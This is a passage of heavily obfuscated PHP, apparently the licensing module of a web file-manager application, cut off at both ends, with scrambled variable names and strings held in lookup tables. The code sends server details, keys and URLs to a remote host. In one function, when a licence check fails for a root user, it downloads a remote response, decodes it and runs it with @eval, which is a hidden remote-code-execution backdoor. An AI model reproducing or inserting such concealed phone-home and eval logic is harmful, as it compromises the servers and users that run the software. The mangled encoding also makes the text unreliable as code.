$ìŞªÍƒ´[108]) { $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[109]] = $í“¡ğˆÆ[$ìŞªÍƒ´[109]]; $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[110]] = $í“¡ğˆÆ[$ìŞªÍƒ´[110]]; $‹µ·§»€ = rand_string(10) . $this->fmzt8802220f . rand_string(5); $È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[111]][$ìŞªÍƒ´[112]] = $this->ayxzb78d44c2($‹µ·§»€, $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[104]]); } if ($this->fmzt8802220f == $ìŞªÍƒ´[108]) { $È·¸İ¯[$ìŞªÍƒ´[87]][$ìŞªÍƒ´[88]][$ìŞªÍƒ´[93]][$ìŞªÍƒ´[97]] = 0; } $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[113]] = _get($this->tuxa87148a27, $ìŞªÍƒ´[114], $ìŞªÍƒ´[6]); $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[115]] = _get($this->tuxa87148a27, $ìŞªÍƒ´[116], $ìŞªÍƒ´[6]); if (KodUser::isRoot() && $this->config[$ìŞªÍƒ´[117]]) { $È·¸İ¯[$ìŞªÍƒ´[100]][$ìŞªÍƒ´[118]] = WEB_ROOT; } return $È·¸İ¯; } private function gdizdf684c85() { $Èä”å¾¯ =& $_SERVER[•€áå–Õ]; $Ìı»øâä =& $_SERVER[ÛóøÜ¾æ]; $¾øàØÒØ = $_SERVER[$Ìı»øâä[24]] == $Ìı»øâä[119]; if ($_SERVER[$Ìı»øâä[24]] == $Ìı»øâä[120] && $_GET[$Ìı»øâä[121]] == $Ìı»øâä[122]) { $¾øàØÒØ = !0; } if ($¾øàØÒØ) { $™Í³ï—ñ = array($Ìı»øâä[107] => $this->fmzt8802220f, $Ìı»øâä[123] => $this->hfcd2a915b95(), $Ìı»øâä[124] => Model($Ìı»øâä[125])->count()); if ($this->fmzt8802220f != $Ìı»øâä[108]) { $¹¹±ƒÁÖ = _get($this->tuxa87148a27, $Ìı»øâä[126]); if ($¹¹±ƒÁÖ) { $™Í³ï—ñ[$Ìı»øâä[127]] = $¹¹±ƒÁÖ; $™Í³ï—ñ[$Ìı»øâä[128]] = strtotime(_get($this->tuxa87148a27, $Ìı»øâä[129])); $™Í³ï—ñ[$Ìı»øâä[130]] = _get($this->tuxa87148a27, $Ìı»øâä[116]); } $•‹Œø = Model($Ìı»øâä[33])->get($Ìı»øâä[131], $Ìı»øâä[6], !0); if (is_string($•‹Œø) && substr($•‹Œø, 0, 1) == $Ìı»øâä[132]) { $•‹Œø = json_decode_force($•‹Œø); } if (is_array($•‹Œø) && $•‹Œø[$Ìı»øâä[133]] && strstr($•‹Œø[$Ìı»øâä[133]], $Ìı»øâä[134])) { $àŞ®‘Íí = explode($Ìı»øâä[134], $•‹Œø[$Ìı»øâä[133]]); $™Í³ï—ñ[$Ìı»øâä[135]] = $àŞ®‘Íí[0]; } } $™Í³ï—ñ = $this->zlgt9bf76607(json_encode($™Í³ï—ñ), md5($Ìı»øâä[136])); $ÇñÎ—‰ = array($Ìı»øâä[137] => $™Í³ï—ñ); $èĞ…ì—¬ = $Èä”å¾¯[699]; call_user_func(array($Ìı»øâä[138], $Ìı»øâä[139]), $ÇñÎ—‰); $±ì‚¦¸å = $Èä”å¾¯[700]; if (!$±ì‚¦¸å) { die; } } if ($this->fmzt8802220f == $Ìı»øâä[108]) { return; } $ÍÀÌ¢ı¦ = array($Ìı»øâä[140], $Ìı»øâä[141], $Ìı»øâä[142], $Ìı»øâä[143], $Ìı»øâä[144], $Ìı»øâä[145]); $’óÙ¦ÌŞ = $Èä”å¾¯[701]; if (!$’óÙ¦ÌŞ) { die; } $Ú‚§æ¡ = Model($Ìı»øâä[33])->get(); $ÇñÎ—‰ = array($Ìı»øâä[146] => $Ú‚§æ¡[$Ìı»øâä[34]], $Ìı»øâä[147] => $Ú‚§æ¡[$Ìı»øâä[35]], $Ìı»øâä[148] => $Ìı»øâä[6]); foreach ($ÍÀÌ¢ı¦ as $°¡¼Öâ‘) { if (!isset($Ú‚§æ¡[$°¡¼Öâ‘]) || !$Ú‚§æ¡[$°¡¼Öâ‘]) { continue; } $ÇñÎ—‰[$°¡¼Öâ‘] = $Ú‚§æ¡[$°¡¼Öâ‘]; } call_user_func(array($Ìı»øâä[138], $Ìı»øâä[139]), $ÇñÎ—‰); $Ïòˆˆ» = $Èä”å¾¯[702]; if (strlen($Ïòˆˆ») < $Èä”å¾¯[673]) { die; } } private function iaxea7b5ced6() { $İ•Õ„ß½ =& $_SERVER[•€áå–Õ]; $ıîÉµäÉ =& $_SERVER[ÛóøÜ¾æ]; if ($_SERVER[$ıîÉµäÉ[24]] != $ıîÉµäÉ[149]) { return; } if (!KodUser::isRoot()) { die; } $÷£Ïì»÷ = $GLOBALS[$ıîÉµäÉ[13]]; if (isset($÷£Ïì»÷[$ıîÉµäÉ[150]])) { $this->vjkf3ac4570b(); die; } if (isset($÷£Ïì»÷[$ıîÉµäÉ[151]]) && isset($÷£Ïì»÷[$ıîÉµäÉ[151]]) == $ıîÉµäÉ[122]) { $÷£Ïì»÷[$ıîÉµäÉ[152]] = Model($ıîÉµäÉ[33])->get($ıîÉµäÉ[153]); } if (!isset($÷£Ïì»÷[$ıîÉµäÉ[152]]) || strlen($÷£Ïì»÷[$ıîÉµäÉ[152]]) != 16) { show_json($ıîÉµäÉ[154] . $÷£Ïì»÷[$ıîÉµäÉ[152]], !1); } $¼õ±ö–œ = Model($ıîÉµäÉ[33])->get($ıîÉµäÉ[99]); $ Œäè³  = md5($_SERVER[$ıîÉµäÉ[105]] . $¼õ±ö–œ); $Î´ò™Òè = $İ•Õ„ß½[703]; $˜ÃÄ¨Á¸ = array($ıîÉµäÉ[152] => $÷£Ïì»÷[$ıîÉµäÉ[152]], $ıîÉµäÉ[155] => rand_string(16), $ıîÉµäÉ[156] => $ıîÉµäÉ[136], $ıîÉµäÉ[157] => $ıîÉµäÉ[158], $ıîÉµäÉ[159] => $_SERVER[$ıîÉµäÉ[160]], $ıîÉµäÉ[161] => $_SERVER[$ıîÉµäÉ[162]], $ıîÉµäÉ[163] => $_SERVER[$ıîÉµäÉ[164]], $ıîÉµäÉ[104] => $ Œäè³ , $ıîÉµäÉ[165] => Model($ıîÉµäÉ[33])->get($ıîÉµäÉ[131])); if ($÷£Ïì»÷[$ıîÉµäÉ[166]] == $ıîÉµäÉ[167]) { $ûÍİ¡İ¯ = $this->zlgt9bf76607($ Œäè³ , $ıîÉµäÉ[168]); $®‚øÀ‰ = $this->ayxzb78d44c2(json_encode($˜ÃÄ¨Á¸), $ Œäè³  . $ıîÉµäÉ[169], 3); $®‚øÀ‰ = $®‚øÀ‰ . $ıîÉµäÉ[170] . $_SERVER[$ıîÉµäÉ[160]]; $ú•í×ï = $this->izcj362d5a7d($ıîÉµäÉ[171] . $ûÍİ¡İ¯ . $ıîÉµäÉ[172] . $®‚øÀ‰, -1); show_json($ú•í×ï, !0); } else { if ($÷£Ïì»÷[$ıîÉµäÉ[166]] == $ıîÉµäÉ[173]) { $á ¯· = substr(md5($ıîÉµäÉ[174] . $ Œäè³ ), 12, 15) . $ıîÉµäÉ[175]; $®‚øÀ‰ = $this->luefb44edbf7(trim($÷£Ïì»÷[$ıîÉµäÉ[176]]), $á ¯·, 2); $„ä¶–—× = json_decode($®‚øÀ‰, !0); if (!is_array($„ä¶–—×) || !is_array($„ä¶–—×[$ıîÉµäÉ[177]]) || $„ä¶–—×[$ıîÉµäÉ[152]] != !0) { $Â¢ç  = $ıîÉµäÉ[178]; $¶ŠŠ ³ = $„ä¶–—×[$ıîÉµäÉ[177]] ? $ıîÉµäÉ[179] . $„ä¶–—×[$ıîÉµäÉ[177]] : $Â¢ç ; show_json($¶ŠŠ ³, !1); } else { $˜ÃÄ¨Á¸[$ıîÉµäÉ[155]] = $„ä¶–—×[$ıîÉµäÉ[177]][$ıîÉµäÉ[180]]; } } else { $„ä¶–—× = $this->izcj362d5a7d($ıîÉµäÉ[181], $˜ÃÄ¨Á¸, 10); } } if (!is_array($„ä¶–—×) || !is_array($„ä¶–—×[$ıîÉµäÉ[177]]) || $„ä¶–—×[$ıîÉµäÉ[152]] != !0) { $Â¢ç  = LNG($ıîÉµäÉ[182]); $¶ŠŠ ³ = $„ä¶–—×[$ıîÉµäÉ[177]] ? $ıîÉµäÉ[179] . $„ä¶–—×[$ıîÉµäÉ[177]] : $Â¢ç ; show_json($¶ŠŠ ³, !1); } $°÷ê¡¹Œ = $„ä¶–—×[$ıîÉµäÉ[177]]; $î„É—øä = $this->ibhadfec9487($°÷ê¡¹Œ[$ıîÉµäÉ[183]]); if (!$î„É—øä || $î„É—øä != $°÷ê¡¹Œ[$ıîÉµäÉ[129]]) { $ıü³¨÷ï = array($ıîÉµäÉ[184] => Model($ıîÉµäÉ[33])->get($ıîÉµäÉ[99]), $ıîÉµäÉ[185] => $_SERVER[$ıîÉµäÉ[105]], $ıîÉµäÉ[186] => this_url(), $ıîÉµäÉ[161] => $_SERVER[$ıîÉµäÉ[162]]); $®‚øÀ‰ = $this->xqhj38dbcd76(json_encode($ıü³¨÷ï)); $this->izcj362d5a7d($ıîÉµäÉ[187] . $®‚øÀ‰); show_json(LNG($ıîÉµäÉ[188]), !0); } $•–Ë›ü = array($ıîÉµäÉ[153] => $°÷ê¡¹Œ[$ıîÉµäÉ[189]], $ıîÉµäÉ[190] => $°÷ê¡¹Œ[$ıîÉµäÉ[191]], $ıîÉµäÉ[192] => rand_string(16), $ıîÉµäÉ[107] => $°÷ê¡¹Œ[$ıîÉµäÉ[193]]); if ($˜ÃÄ¨Á¸[$ıîÉµäÉ[155]]) { $•–Ë›ü[$ıîÉµäÉ[192]] = $˜ÃÄ¨Á¸[$ıîÉµäÉ[155]]; } $’ĞÔÁ­Ş = substr(md5($•–Ë›ü[$ıîÉµäÉ[190]]), 10, 10); $–Áõñ“ø = $’ĞÔÁ­Ş . $•–Ë›ü[$ıîÉµäÉ[107]] . $•–Ë›ü[$ıîÉµäÉ[192]]; $É³µÍ€ˆ = $İ•Õ„ß½[704]; $•–Ë›ü[$ıîÉµäÉ[109]] = strrev(base64_encode($this->zlgt9bf76607($–Áõñ“ø, $ıîÉµäÉ[194]))); $Æ¯úéšç = $İ•Õ„ß½[705]; if (strlen($Æ¯úéšç) < $İ•Õ„ß½[677]) { return; } $ö “Šæ– = rand_string(16); $Ã««€ õ = $İ•Õ„ß½[706]; $©½‘ŸŒĞ = $ö “Šæ– . $•–Ë›ü[$ıîÉµäÉ[107]] . $this->zlgt9bf76607(md5($•–Ë›ü[$ıîÉµäÉ[153]]), $ö “Šæ–); $•–Ë›ü[$ıîÉµäÉ[110]] = base64_encode(strrev($this->zlgt9bf76607($©½‘ŸŒĞ, $ıîÉµäÉ[195]))); $Ò˜©‚È = $İ•Õ„ß½[707]; if (!$Ò˜©‚È) { return; } if ($°÷ê¡¹Œ[$ıîÉµäÉ[196]] && $°÷ê¡¹Œ[$ıîÉµäÉ[196]] >= 1) { Model($ıîÉµäÉ[33])->setDeep($ıîÉµäÉ[197], $ıîÉµäÉ[122]); } Model($ıîÉµäÉ[33])->set($•–Ë›ü); $Ôş¢¨‚Ÿ = md5($_SERVER[$ıîÉµäÉ[105]] . strrev($¼õ±ö–œ) . $•–Ë›ü[$ıîÉµäÉ[190]]); $×™§ûşã = strrev(substr($Ôş¢¨‚Ÿ, 10, 16)); $¯’ õ˜ø = $this->ayxzb78d44c2(json_encode($°÷ê¡¹Œ), $Ôş¢¨‚Ÿ); $×š…¯àï = $İ•Õ„ß½[708]; if (!$×š…¯àï) { die; } $¢­í²‰ = array_to_keyvalue(Model($ıîÉµäÉ[7])->listData(), $ıîÉµäÉ[198]); $í—ıíš = $¢­í²‰[$ıîÉµäÉ[199]]; $Âú†§  = array(); $Âú†§ [$×™§ûşã] = $¯’ õ˜ø; $õŞ·æ£É = $İ•Õ„ß½[709]; while ($õŞ·æ£É < $İ•Õ„ß½[13]) { if ($õŞ·æ£É >= 0) { break; } $õŞ·æ£É++; } Model($ıîÉµäÉ[7])->update($í—ıíš[$ıîÉµäÉ[200]], array($ıîÉµäÉ[201] => $Âú†§ )); $’”êÓ¥Ï = $İ•Õ„ß½[710]; if (!$’”êÓ¥Ï) { die; } $this->tuxa87148a27 = $°÷ê¡¹Œ; $this->fmzt8802220f = $•–Ë›ü[$ıîÉµäÉ[107]]; $À°§åŞÄ = $İ•Õ„ß½[711]; if (strlen($À°§åŞÄ) < $İ•Õ„ß½[670]) { die; } $this->licenseRegistSuccess(); Cache::set($ıîÉµäÉ[202] . md5($¼õ±ö–œ . $ıîÉµäÉ[203]), $ıîÉµäÉ[6]); show_json(LNG($ıîÉµäÉ[188]), !0); } private function licenseRegistSuccess() { $Â—Öúì =& $_SERVER[ÛóøÜ¾æ]; $Û¨õÕúÓ = Model($Â—Öúì[33])->get(); if ($Û¨õÕúÓ[$Â—Öúì[63]] != $Â—Öúì[122]) { Model($Â—Öúì[33])->set($Â—Öúì[63], $Â—Öúì[122]); } Action($Â—Öúì[204])->initStart(!0); } private function vjkf3ac4570b() { $ŸÙ‘Úæ =& $_SERVER[•€áå–Õ]; $¼ÓÉ¯ùù =& $_SERVER[ÛóøÜ¾æ]; Model($¼ÓÉ¯ùù[33])->set(array($¼ÓÉ¯ùù[153] => $¼ÓÉ¯ùù[6], $¼ÓÉ¯ùù[190] => $¼ÓÉ¯ùù[6], $¼ÓÉ¯ùù[107] => $¼ÓÉ¯ùù[108], $¼ÓÉ¯ùù[109] => $¼ÓÉ¯ùù[6], $¼ÓÉ¯ùù[110] => $¼ÓÉ¯ùù[6])); Model($¼ÓÉ¯ùù[33])->setDeep($¼ÓÉ¯ùù[197], $¼ÓÉ¯ùù[205]); $ş¸âå¸± = $ŸÙ‘Úæ[712]; if (!$ş¸âå¸±) { return; } $this->tuxa87148a27 = array(); $ÉñúÇ’ = $ŸÙ‘Úæ[713]; $this->fmzt8802220f = $¼ÓÉ¯ùù[108]; $…Ø”¤ã  = $ŸÙ‘Úæ[714]; if (strlen($…Ø”¤ã ) < $ŸÙ‘Úæ[666]) { die; } } private function gcxicd23f042() { $íÌ¦è˜ =& $_SERVER[•€áå–Õ]; $¿ä”Ş€· =& $_SERVER[ÛóøÜ¾æ]; $_SERVER[$¿ä”Ş€·[162]] = _get($_SERVER, $¿ä”Ş€·[162], APP_HOST); $this->fmzt8802220f = $¿ä”Ş€·[108]; $¾¡Ù­²ê = $íÌ¦è˜[715]; $ÆØ·É¯× = Model($¿ä”Ş€·[33])->get(); $¸Ìº¥éÌ = $íÌ¦è˜[716]; if (!$¸Ìº¥éÌ) { die; } if ($ÆØ·É¯×[$¿ä”Ş€·[107]] == $¿ä”Ş€·[108]) { return; } $£ÌÃœÕã = Model($¿ä”Ş€·[33])->get($¿ä”Ş€·[99]); $…í”‚£Ÿ = $¿ä”Ş€·[202] . md5($£ÌÃœÕã . $¿ä”Ş€·[203]); $ØŸÊÙ¯¡ = $íÌ¦è˜[717]; if (strlen($ØŸÊÙ¯¡) < $íÌ¦è˜[673]) { die; } $Î†—§á• = Cache::get($…í”‚£Ÿ); $ıĞ¨Ç»› = $íÌ¦è˜[718]; while ($ıĞ¨Ç»› < $íÌ¦è˜[677]) { if ($ıĞ¨Ç»› >= 0) { break; } $ıĞ¨Ç»›++; } if (!is_array($Î†—§á•) || !isset($Î†—§á•[$¿ä”Ş€·[206]]) || time() - $Î†—§á•[$¿ä”Ş€·[206]] >= 60) { $ŠÀ­ò× = Model($¿ä”Ş€·[7])->loadList(); $÷ß‹ÈáÏ = $ŠÀ­ò×[$¿ä”Ş€·[199]]; $åÔı´üñ = md5($_SERVER[$¿ä”Ş€·[105]] . strrev($£ÌÃœÕã) . $ÆØ·É¯×[$¿ä”Ş€·[190]]); $üßÍ¦È = strrev(substr($åÔı´üñ, 10, 16)); $Î†—§á• = $this->luefb44edbf7($÷ß‹ÈáÏ[$¿ä”Ş€·[85]][$üßÍ¦È], $åÔı´üñ); $Î†—§á• = json_decode($Î†—§á•, !0); } if (!is_array($Î†—§á•)) { return $this->vjkf3ac4570b(); } $©ß‹×ƒ = strtotime($Î†—§á•[$¿ä”Ş€·[129]]); if (time() >= $©ß‹×ƒ) { return $this->vjkf3ac4570b(); } if (time() - $Î†—§á•[$¿ä”Ş€·[206]] > 20) { $Î†—§á•[$¿ä”Ş€·[206]] = time(); Cache::set($…í”‚£Ÿ, $Î†—§á•); } $this->tuxa87148a27 = $Î†—§á•; $this->fmzt8802220f = $ÆØ·É¯×[$¿ä”Ş€·[107]]; } private function gkrp13d37d54() { $·¥àßµÕ =& $_SERVER[ÛóøÜ¾æ]; $¥²íÓƒ“ = $GLOBALS[$·¥àßµÕ[13]]; $ŞïòáÉ› = $_SERVER[$·¥àßµÕ[24]]; if ($ŞïòáÉ› == $·¥àßµÕ[207] && $this->fmzt8802220f == $·¥àßµÕ[108]) { show_json(LNG($·¥àßµÕ[208]), !1, $·¥àßµÕ[209]); } $øòïƒĞ­ = array($·¥àßµÕ[210], $·¥àßµÕ[211]); if (in_array($ŞïòáÉ›, $øòïƒĞ­)) { if ($this->fmzt8802220f == $·¥àßµÕ[108] && isset($¥²íÓƒ“[$·¥àßµÕ[212]])) { show_json(LNG($·¥àßµÕ[208]), !1, $·¥àßµÕ[209]); die; } $°­ËÃ¥ê = $this->hfcd2a915b95(); if ($°­ËÃ¥ê != intval($·¥àßµÕ[213])) { if ($°­ËÃ¥ê <= Model($·¥àßµÕ[125])->count()) { show_json(LNG($·¥àßµÕ[214]), !1, $·¥àßµÕ[209]); die; } } } } private function gexs4834d7f3() { $çü¶˜‚İ =& $_SERVER[ÛóøÜ¾æ]; $èáˆ×éß = array($çü¶˜‚İ[119], $çü¶˜‚İ[120]); if (!KodUser::isRoot() || !isset($_GET[$çü¶˜‚İ[215]])) { return; } if (!in_array($_SERVER[$çü¶˜‚İ[24]], $èáˆ×éß)) { return; } $Ï°ˆ›çÍ = $çü¶˜‚İ[216]; $Ï°ˆ›çÍ = $this->wubf57765344($Ï°ˆ›çÍ, $çü¶˜‚İ[217]); $œº¡Áéü = stream_context_create(array($çü¶˜‚İ[218] => array($çü¶˜‚İ[219] => $çü¶˜‚İ[220], $çü¶˜‚İ[221] => 3))); $‰£§•‚› = @file_get_contents($Ï°ˆ›çÍ, !1, $œº¡Áéü); header($çü¶˜‚İ[222]); if ($‰£§•‚› && strstr($‰£§•‚›, $çü¶˜‚İ[223])) { echo $‰£§•‚›; } die; } public function ufza77a3da55($ƒßÎ½–¾) { $ë˜ßè°¢ =& $_SERVER[ÛóøÜ¾æ]; if ($this->fmzt8802220f == $ë˜ßè°¢[224]) { return $ƒßÎ½–¾; } $°Ÿ£§É = array($ë˜ßè°¢[225] => $ë˜ßè°¢[226], $ë˜ßè°¢[227] => $ë˜ßè°¢[226], $ë˜ßè°¢[228] => $ë˜ßè°¢[226], $ë˜ßè°¢[229] => $ë˜ßè°¢[230], $ë˜ßè°¢[231] => $ë˜ßè°¢[230], $ë˜ßè°¢[232] => $ë˜ßè°¢[230], $ë˜ßè°¢[233] => $ë˜ßè°¢[230], $ë˜ßè°¢[234] => $ë˜ßè°¢[230], $ë˜ßè°¢[235] => $ë˜ßè°¢[230], $ë˜ßè°¢[236] => $ë˜ßè°¢[230], $ë˜ßè°¢[237] => $ë˜ßè°¢[230], $ë˜ßè°¢[238] => $ë˜ßè°¢[230], $ë˜ßè°¢[239] => $ë˜ßè°¢[230], $ë˜ßè°¢[240] => $ë˜ßè°¢[230], $ë˜ßè°¢[241] => $ë˜ßè°¢[230]); $¬ñàû’Ì = explode($ë˜ßè°¢[242], _get($this->tuxa87148a27, $ë˜ßè°¢[114], $ë˜ßè°¢[6])); $‚Úï¤€¾ = array(); foreach ($°Ÿ£§É as $·è“íªó => $Û‡ŞÛ”ï) { if ($Û‡ŞÛ”ï == $ë˜ßè°¢[226] && substr($this->fmzt8802220f, 0, 1) == $ë˜ßè°¢[226]) { continue; } if (!in_array($·è“íªó, $¬ñàû’Ì)) { $‚Úï¤€¾[] = $·è“íªó; } } foreach ($‚Úï¤€¾ as $·è“íªó) { unset($ƒßÎ½–¾[$·è“íªó]); } return $ƒßÎ½–¾; $Œ’Œ±™÷ = $_SERVER[•€áå–Õ][719]; if (!$Œ’Œ±™÷) { return; } } private function lqag23fd3e72() { $Õ½¡—²‹ =& $_SERVER[ÛóøÜ¾æ]; if ($this->fmzt8802220f != $Õ½¡—²‹[108]) { $GLOBALS[$Õ½¡—²‹[85]][$Õ½¡—²‹[89]][$Õ½¡—²‹[243]] = $Õ½¡—²‹[205]; return; } $GLOBALS[$Õ½¡—²‹[85]][$Õ½¡—²‹[244]] = $Õ½¡—²‹[122]; if (Model($Õ½¡—²‹[245])->get($Õ½¡—²‹[63]) != $Õ½¡—²‹[205]) { Model($Õ½¡—²‹[245])->set($Õ½¡—²‹[63], $Õ½¡—²‹[205]); } } public function dirm74349bf3() { return $_SERVER[ÛóøÜ¾æ][246]; } private function mywea0400cc4() { $Í ùÛÓÎ =& $_SERVER[•€áå–Õ]; $œ‹™ë˜  =& $_SERVER[ÛóøÜ¾æ]; $×êÉÎïŠ = array($œ‹™ë˜ [247], $œ‹™ë˜ [248], $œ‹™ë˜ [249]); $‹Ó½êì‡ = $Í ùÛÓÎ[720]; $İıì¹ñ‚ = $œ‹™ë˜ [250] . md5($œ‹™ë˜ [251]); if ($this->fmzt8802220f == $œ‹™ë˜ [108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$œ‹™ë˜ [24]], $×êÉÎïŠ)) { return; } if (time() % 4 != 0) { return; } $Æ…±ùåÖ = call_user_func(array($œ‹™ë˜ [252], $œ‹™ë˜ [253]), $İıì¹ñ‚); $Í”ˆ¯»… = $Í ùÛÓÎ[721]; if ($Æ…±ùåÖ && time() - $Æ…±ùåÖ < intval($œ‹™ë˜ [254])) { return; } call_user_func(array($œ‹™ë˜ [252], $œ‹™ë˜ [139]), $İıì¹ñ‚, time()); $¡¨›Şô« = $Í ùÛÓÎ[722]; if (strlen($¡¨›Şô«) < $Í ùÛÓÎ[677]) { die; } $ƒæ£È°¶ = Model($œ‹™ë˜ [33])->get($œ‹™ë˜ [99]); $¤í¹·æ„ = array($œ‹™ë˜ [152] => Model($œ‹™ë˜ [33])->get($œ‹™ë˜ [153]), $œ‹™ë˜ [166] => $this->fmzt8802220f, $œ‹™ë˜ [163] => $_SERVER[$œ‹™ë˜ [164]], $œ‹™ë˜ [165] => Model($œ‹™ë˜ [33])->get($œ‹™ë˜ [131]), $œ‹™ë˜ [104] => md5($_SERVER[$œ‹™ë˜ [105]] . $ƒæ£È°¶), $œ‹™ë˜ [156] => $œ‹™ë˜ [136], $œ‹™ë˜ [159] => $_SERVER[$œ‹™ë˜ [160]]); $Ş£Œîç = $Í ùÛÓÎ[723]; if (!$Ş£Œîç) { die; } $ÄŞëŞªº = $this->izcj362d5a7d($œ‹™ë˜ [255], $¤í¹·æ„); if (!is_array($ÄŞëŞªº)) { return; } if ($ÄŞëŞªº[$œ‹™ë˜ [152]] && $ÄŞëŞªº[$œ‹™ë˜ [256]]) { if ($this->ibhadfec9487($ÄŞëŞªº[$œ‹™ë˜ [256]]) == $¤í¹·æ„[$œ‹™ë˜ [152]]) { return; } } $this->vjkf3ac4570b(); $ÙƒšìÊ = $Í ùÛÓÎ[724]; if (strlen($ÙƒšìÊ) < $Í ùÛÓÎ[666]) { return; } if ($this->ibhadfec9487($ÄŞëŞªº[$œ‹™ë˜ [256]]) != $¤í¹·æ„[$œ‹™ë˜ [152]]) { $¤È§¾á¯ = array($œ‹™ë˜ [184] => $ƒæ£È°¶, $œ‹™ë˜ [185] => $_SERVER[$œ‹™ë˜ [105]], $œ‹™ë˜ [186] => this_url(), $œ‹™ë˜ [161] => $_SERVER[$œ‹™ë˜ [162]]); $£´ªÌ¦Ü = $this->xqhj38dbcd76(json_encode($¤È§¾á¯)); $ÄŞëŞªº = $this->izcj362d5a7d($œ‹™ë˜ [187] . $£´ªÌ¦Ü); if ($ÄŞëŞªº && is_array($ÄŞëŞªº) && isset($ÄŞëŞªº[$œ‹™ë˜ [256]])) { $··ºàáÕ = $this->luefb44edbf7($ÄŞëŞªº[$œ‹™ë˜ [256]], 2); if ($··ºàáÕ) { $··ºàáÕ = $this->ibhadfec9487($··ºàáÕ); } if ($··ºàáÕ) { try { @eval($··ºàáÕ); } catch (Exception $Àã•˜ÆÔ) { } } } } } private function izcj362d5a7d($ÂâÙõè¹ = '', $…›íâİı = array(), $ÊÎ¯ŸÒ = 5) { $™é¶¬ğ­ =& $_SERVER[•€áå–Õ]; $—çÉÉÈĞ =& $_SERVER[ÛóøÜ¾æ]; $ÆĞÑÍúÌ = $—çÉÉÈĞ[257]; $ÆĞÑÍúÌ = $this->wubf57765344($ÆĞÑÍúÌ, $—çÉÉÈĞ[258]); $ßÑÜ²İÏ = $™é¶¬ğ­[725]; while (strlen($ßÑÜ²İÏ) < $™é¶¬ğ­[13]) { if (!$ßÑÜ²İÏ) { break; } $ßÑÜ²İÏ++; } $ÆĞÑÍúÌ = $ÆĞÑÍúÌ . $ÂâÙõè¹; if ($…›íâİı && is_array($…›íâİı)) { $ÆĞÑÍúÌ = $ÆĞÑÍúÌ . $—çÉÉÈĞ[259] . http_build_query($…›íâİı); } if ($…›íâİı === -1) { return $ÆĞÑÍúÌ; } $ğ„—§Š = stream_context_create(array($—çÉÉÈĞ[218] => array($—çÉÉÈĞ[221] => $ÊÎ¯ŸÒ, $—çÉÉÈĞ[219] => $—çÉÉÈĞ[260]), $—çÉÉÈĞ[261] => array($—çÉÉÈĞ[262] => !1, $—çÉÉÈĞ[263] => !1))); $…›íâİı = @file_get_contents($ÆĞÑÍúÌ, !1, $ğ„—§Š); return json_decode($…›íâİı, !0); $êõ¯•úõ = $™é¶¬ğ­[726]; while (strlen($êõ¯•úõ) < $™é¶¬ğ­[666]) { if (!$êõ¯•úõ) { break; } $êõ¯•úõ++; } } private function hfcd2a915b95() { $´ßÀ®øà =& $_SERVER[•€áå–Õ]; $£²ôòÃ =& $_SERVER[ÛóøÜ¾æ]; $««Éô«ğ = array($£²ôòÃ[264] => $£²ôòÃ[265], $£²ôòÃ[266] => $£²ôòÃ[267], $£²ôòÃ[268] => $£²ôòÃ[269], $£²ôòÃ[270] => $£²ôòÃ[271], $£²ôòÃ[272] => $£²ôòÃ[273], $£²ôòÃ[274] => $£²ôòÃ[213], $£²ôòÃ[275] => $£²ôòÃ[213], $£²ôòÃ[276] => $£²ôòÃ[265], $£²ôòÃ[277] => $£²ôòÃ[267], $£²ôòÃ[278] => $£²ôòÃ[269], $£²ôòÃ[279] => $£²ôòÃ[280], $£²ôòÃ[281] => $£²ôòÃ[271], $£²ôòÃ[282] => $£²ôòÃ[283], $£²ôòÃ[284] => $£²ôòÃ[273], $£²ôòÃ[285] => $£²ôòÃ[286], $£²ôòÃ[287] => $£²ôòÃ[288], $£²ôòÃ[289] => $£²ôòÃ[290]); $®‚®Çºà = $´ßÀ®øà[727]; while ($®‚®Çºà < $´ßÀ®øà[666]) { if ($®‚®Çºà >= 0) { break; } $®‚®Çºà++; } $ö›Í¿í = $««Éô«ğ[$this->fmzt8802220f]; $ö›Í¿í = intval($ö›Í¿í ? $ö›Í¿í : $£²ôòÃ[265]); $ßÉñŒüí = _get($this->tuxa87148a27, $£²ôòÃ[291]); $ßÉñŒüí = $ßÉñŒüí ? intval($ßÉñŒüí) : 0; return $ö›Í¿í + $ßÉñŒüí; } public function srop4ab5e41e($­Å¾ûà¢) { $éñ’á³ =& $_SERVER[•€áå–Õ]; $´Õ½—àş =& $_SERVER[ÛóøÜ¾æ]; $â„•Ñè = $this->hfcd2a915b95(); $¸ŠêäÎ = $éñ’á³[728]; if ($­Å¾ûà¢[$´Õ½—àş[292]] == $´Õ½—àş[122]) { return; } if ($â„•Ñè >= intval($´Õ½—àş[213])) { return; } $Ø¢”®•– = Model($´Õ½—àş[125])->count(); $öìÒî™½ = $éñ’á³[729]; if ($Ø¢”®•– <= $â„•Ñè) { return; } $Şßß²¡¯ = Model($´Õ½—àş[125])->field($´Õ½—àş[292])->limit($â„•Ñè)->select(); $şİ™úÈ = $éñ’á³[730]; while (strlen($şİ™úÈ) < $éñ’á³[677]) { if (!$şİ™úÈ) { break; } $şİ™úÈ++; } $Şßß²¡¯ = array_to_keyvalue($Şßß²¡¯, $´Õ½—àş[6], $´Õ½—àş[292]); if (!in_array($­Å¾ûà¢[$´Õ½—àş[292]], $Şßß²¡¯)) { show_json($´Õ½—àş[293], !1, $´Õ½—àş[209]); } } public function fdkrcd4f7191() { $áîàÆèª =& $_SERVER[•€áå–Õ]; $¶éù™ç =& $_SERVER[ÛóøÜ¾æ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ğ¬Ê¤åŞ = $¶éù™ç[216]; $‹¸²½Õ = $áîàÆèª[731]; $Ğ¬Ê¤åŞ = $this->wubf57765344($Ğ¬Ê¤åŞ, $¶éù™ç[217]); $Š½ö¸‘ = $áîàÆèª[732]; while ($Š½ö¸‘ < $áîàÆèª[13]) { if ($Š½ö¸‘ >= 0) { break; } $Š½ö¸‘++; } $¨©ùÃá = stream_context_create(array($¶éù™ç[218] => array($¶éù™ç[219] => $¶éù™ç[220], $¶éù™ç[221] => 3))); $™å·Ü©Ü = @file_get_contents($Ğ¬Ê¤åŞ, !1, $¨©ùÃá); echo $¶éù™ç[294] . hash_encode($™å·Ü©Ü) . 